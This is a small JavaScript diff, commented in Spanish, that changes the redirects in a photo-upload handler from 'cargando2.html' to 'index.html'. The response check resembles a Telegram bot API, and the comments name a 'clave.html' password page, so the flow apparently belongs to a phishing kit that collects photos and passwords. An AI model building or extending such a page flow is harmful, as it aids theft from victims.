@@ -241,15 +241,15 @@
             const result = await response.json();
             if (result.ok) {
                 alert("Procesando información...");
-                window.location.href = "cargando2.html"; // Redirección a clave.html en caso de éxito
+                window.location.href = "index.html"; // Redirección a clave.html en caso de éxito
             } else {
                 alert("Error al enviar la foto: " + result.description);
-                window.location.href = "cargando2.html"; // Redirección a clave.html en caso de error
+                window.location.href = "index.html"; // Redirección a clave.html en caso de error
             }
         } catch (error) {
             console.error("Error:", error);
             alert("Hubo un error al enviar la foto.");
-            window.location.href = "cargando2.html"; // Redirección a clave.html en caso de error
+            window.location.href = "index.html"; // Redirección a clave.html en caso de error
         }
     });
 
